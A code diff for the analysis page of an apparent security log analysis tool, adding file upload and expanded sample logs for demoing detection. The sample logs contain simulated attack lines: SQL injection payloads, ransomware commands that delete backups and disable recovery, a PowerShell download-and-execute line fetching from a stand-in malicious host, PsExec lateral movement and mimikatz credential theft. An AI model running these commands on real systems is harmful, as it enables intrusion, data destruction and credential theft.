@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useState, useRef, useEffect } from "react";
 import { useAnalyzeLogs, useSaveReport } from "@workspace/api-client-react";
 import { useAuth } from "@/lib/auth-context";
 import { getAuthHeaders } from "@/lib/utils";
@@ -8,21 +8,43 @@ import { Badge } from "@/components/ui/badge";
 import { AuthModal } from "@/components/auth/auth-modal";
 import { RiskGauge } from "@/components/visuals/risk-gauge";
 import { NetworkGraph } from "@/components/visuals/network-graph";
-import { Activity, ShieldAlert, Cpu, CheckCircle2, Save, Loader2, Play, Copy, ExternalLink, Download, FileJson, Target, Shield, BookOpen, AlertTriangle, User } from "lucide-react";
+import { Activity, ShieldAlert, Cpu, CheckCircle2, Save, Loader2, Play, Copy, ExternalLink, FileJson, Target, Shield, BookOpen, Upload, Trash2, User } from "lucide-react";
 import { motion, AnimatePresence } from "framer-motion";
 import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from "@/components/ui/accordion";
 
 const SAMPLE_LOGS = {
-  sql: "192.168.1.100 - - [10/Oct/2023:13:55:36 -0700] \"GET /login.php?user=admin'%20OR%20'1'='1'-- HTTP/1.1\" 200 4523\n192.168.1.100 - - [10/Oct/2023:13:55:38 -0700] \"POST /api/users HTTP/1.1\" 500 120\n192.168.1.100 - - [10/Oct/2023:13:55:40 -0700] \"GET /admin/dashboard HTTP/1.1\" 200 8900",
-  ransomware: "EventID: 4688, Task Category: Process Creation, cmdline: vssadmin.exe Delete Shadows /All /Quiet\nEventID: 4688, Task Category: Process Creation, cmdline: bcdedit /set {default} recoveryenabled No\nEventID: 4688, Task Category: Process Creation, cmdline: wbadmin delete catalog -quiet",
-  apt: "Action: Network Connection, Source IP: 10.0.0.5, Destination IP: 185.199.108.153, Destination Port: 443, Process: powershell.exe\nAction: Process Create, Parent: svchost.exe, Process: cmd.exe /c powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://malicious-domain.com/payload.ps1')\"\nAction: Registry Edit, Path: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater, Value: C:\\Users\\Public\\payload.exe"
+  sql: `192.168.1.100 - - [10/Oct/2023:13:55:36 -0700] "GET /login.php?user=admin'%20OR%20'1'='1'-- HTTP/1.1" 200 4523
+192.168.1.100 - - [10/Oct/2023:13:55:37 -0700] "GET /login.php?user=admin'%20UNION%20SELECT%201,username,password,4%20FROM%20users-- HTTP/1.1" 200 8920
+192.168.1.100 - - [10/Oct/2023:13:55:38 -0700] "POST /api/users HTTP/1.1" 500 120
+[ERROR] SQL syntax error near 'OR 1=1' in query: SELECT * FROM users WHERE username='admin' OR '1'='1'
+192.168.1.100 - - [10/Oct/2023:13:55:40 -0700] "GET /admin/dashboard HTTP/1.1" 200 8900`,
+  ransomware: `EventID: 4688, Task Category: Process Creation, SubjectUserName: SYSTEM, cmdline: vssadmin.exe Delete Shadows /All /Quiet
+EventID: 4688, Task Category: Process Creation, SubjectUserName: SYSTEM, cmdline: bcdedit /set {default} recoveryenabled No
+EventID: 4688, Task Category: Process Creation, SubjectUserName: SYSTEM, cmdline: wbadmin delete catalog -quiet
+EventID: 4663, ObjectName: C:\\Users\\Public\\Documents\\*.docx, AccessMask: 0x2 (WRITE_DATA)
+EventID: 4663, ObjectName: C:\\Users\\Desktop\\*.xlsx, AccessMask: 0x2 (WRITE_DATA)
+[ALERT] Ransomware: Mass file encryption detected. Files renamed to .locked extension. C2: 185.220.101.45`,
+  apt: `Action: Network Connection, Source IP: 10.0.0.5, Destination IP: 185.199.108.153, Destination Port: 443, Process: powershell.exe
+Action: Process Create, Parent: svchost.exe, Process: cmd.exe /c powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://malicious-domain.ru/payload.ps1')"
+Action: Registry Edit, Path: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater, Value: C:\\Users\\Public\\payload.exe
+Action: Lateral Movement, Source: WORKSTATION-01, Destination: DC-01, Method: PsExec, User: DOMAIN\\Administrator
+Action: Credential Access, Process: lsass.exe, Tool: mimikatz, Hashes: 5f4dcc3b5aa765d61d8327deb882cf99`
 };
 
 export default function Analyze() {
   const { isAuthenticated, token } = useAuth();
   const [logs, setLogs] = useState("");
   const [showAuthModal, setShowAuthModal] = useState(false);
-  
+  const fileInputRef = useRef<HTMLInputElement>(null);
+
+  useEffect(() => {
+    const params = new URLSearchParams(window.location.search);
+    const demo = params.get("demo");
+    if (demo && SAMPLE_LOGS[demo as keyof typeof SAMPLE_LOGS]) {
+      setLogs(SAMPLE_LOGS[demo as keyof typeof SAMPLE_LOGS]);
+    }
+  }, []);
+
   const analyzeMutation = useAnalyzeLogs({ request: getAuthHeaders(token) });
   const saveMutation = useSaveReport({ request: getAuthHeaders(token) });
 
@@ -65,6 +87,18 @@ export default function Analyze() {
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
+  };
+
+  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const file = e.target.files?.[0];
+    if (!file) return;
+    const reader = new FileReader();
+    reader.onload = (event) => {
+      const text = event.target?.result as string;
+      setLogs(text);
+    };
+    reader.readAsText(file);
+    e.target.value = "";
   };
 
   const handleCopyIOCs = () => {
@@ -111,38 +145,75 @@ export default function Analyze() {
       <div className="grid lg:grid-cols-12 gap-8">
         {/* Left Column: Input */}
         <div className="lg:col-span-4 flex flex-col gap-4">
-          <div className="flex flex-wrap gap-2">
-            <Badge variant="outline" className="cursor-pointer hover:bg-slate-100 py-1.5 px-3 font-medium border-slate-300" onClick={() => setLogs(SAMPLE_LOGS.sql)}>SQL Injection</Badge>
-            <Badge variant="outline" className="cursor-pointer hover:bg-slate-100 py-1.5 px-3 font-medium border-slate-300" onClick={() => setLogs(SAMPLE_LOGS.ransomware)}>Ransomware</Badge>
-            <Badge variant="outline" className="cursor-pointer hover:bg-slate-100 py-1.5 px-3 font-medium border-slate-300" onClick={() => setLogs(SAMPLE_LOGS.apt)}>APT Recon</Badge>
+          {/* Sample log quick-load chips */}
+          <div>
+            <p className="text-xs text-slate-500 uppercase font-semibold tracking-wider mb-2">Load sample logs:</p>
+            <div className="flex flex-wrap gap-2">
+              <Badge variant="outline" className="cursor-pointer hover:bg-primary/10 hover:border-primary/40 hover:text-primary py-1.5 px-3 font-medium border-slate-300 transition-colors" onClick={() => setLogs(SAMPLE_LOGS.sql)}>SQL Injection</Badge>
+              <Badge variant="outline" className="cursor-pointer hover:bg-primary/10 hover:border-primary/40 hover:text-primary py-1.5 px-3 font-medium border-slate-300 transition-colors" onClick={() => setLogs(SAMPLE_LOGS.ransomware)}>Ransomware</Badge>
+              <Badge variant="outline" className="cursor-pointer hover:bg-primary/10 hover:border-primary/40 hover:text-primary py-1.5 px-3 font-medium border-slate-300 transition-colors" onClick={() => setLogs(SAMPLE_LOGS.apt)}>APT Recon</Badge>
+            </div>
           </div>
 
-          <Card className="flex-1 flex flex-col shadow-md border-slate-200 h-[600px]">
-            <CardHeader className="bg-slate-50/50 border-b border-slate-100 pb-4">
-              <CardTitle className="text-lg flex items-center gap-2">
-                <Activity className="w-5 h-5 text-primary" />
-                Raw Logs Input
-              </CardTitle>
+          <Card className="flex flex-col shadow-md border-slate-200">
+            <CardHeader className="bg-slate-50/50 border-b border-slate-100 py-3 px-4">
+              <div className="flex items-center justify-between">
+                <CardTitle className="text-base flex items-center gap-2">
+                  <Activity className="w-4 h-4 text-primary" />
+                  Raw Logs Input
+                </CardTitle>
+                <div className="flex items-center gap-1">
+                  <input
+                    ref={fileInputRef}
+                    type="file"
+                    accept=".log,.txt,.json,.csv"
+                    className="hidden"
+                    onChange={handleFileUpload}
+                  />
+                  <Button
+                    variant="ghost"
+                    size="sm"
+                    className="h-8 text-xs text-slate-500 hover:text-primary"
+                    onClick={() => fileInputRef.current?.click()}
+                    title="Upload log file"
+                  >
+                    <Upload className="w-3.5 h-3.5 mr-1" /> Upload File
+                  </Button>
+                  {logs && (
+                    <Button
+                      variant="ghost"
+                      size="sm"
+                      className="h-8 text-xs text-slate-400 hover:text-red-500"
+                      onClick={() => setLogs("")}
+                      title="Clear logs"
+                    >
+                      <Trash2 className="w-3.5 h-3.5" />
+                    </Button>
+                  )}
+                </div>
+              </div>
             </CardHeader>
-            <CardContent className="p-0 flex-1 flex flex-col relative">
+            <CardContent className="p-0 flex flex-col">
               <textarea
                 value={logs}
                 onChange={(e) => setLogs(e.target.value)}
-                placeholder="Paste syslogs, AWS CloudTrail, firewall logs, or application logs here..."
-                className="w-full h-full p-6 resize-none outline-none font-mono text-xs text-slate-700 bg-transparent placeholder:text-slate-400"
+                placeholder={"Paste syslogs, AWS CloudTrail, firewall logs,\nWindows Event logs, or any raw log format here...\n\nOr click 'Upload File' to load a .log / .txt file,\nor use a sample above to try it instantly."}
+                className="w-full p-4 resize-none outline-none font-mono text-xs text-slate-700 bg-transparent placeholder:text-slate-400 leading-relaxed"
+                style={{ minHeight: "320px" }}
               />
-              <div className="absolute bottom-0 left-0 right-0 p-4 bg-gradient-to-t from-white via-white/90 to-transparent">
+              <div className="p-4 border-t border-slate-100 bg-slate-50/50">
                 <Button 
                   onClick={handleAnalyze} 
                   disabled={!logs.trim() || analyzeMutation.isPending}
-                  className="w-full h-12 text-base shadow-lg shadow-primary/25"
+                  className="w-full h-11 text-sm shadow-md shadow-primary/20"
                 >
                   {analyzeMutation.isPending ? (
-                    <><Loader2 className="w-5 h-5 mr-2 animate-spin" /> Analyzing Logs...</>
+                    <><Loader2 className="w-4 h-4 mr-2 animate-spin" /> Analyzing Logs...</>
                   ) : (
-                    <><Play className="w-5 h-5 mr-2" /> Run Analysis</>
+                    <><Play className="w-4 h-4 mr-2" /> Run Analysis</>
                   )}
                 </Button>
+                <p className="text-[11px] text-slate-400 text-center mt-2">Supports syslogs, CloudTrail, Zeek, Suricata, Windows Event logs</p>
               </div>
             </CardContent>
           </Card>
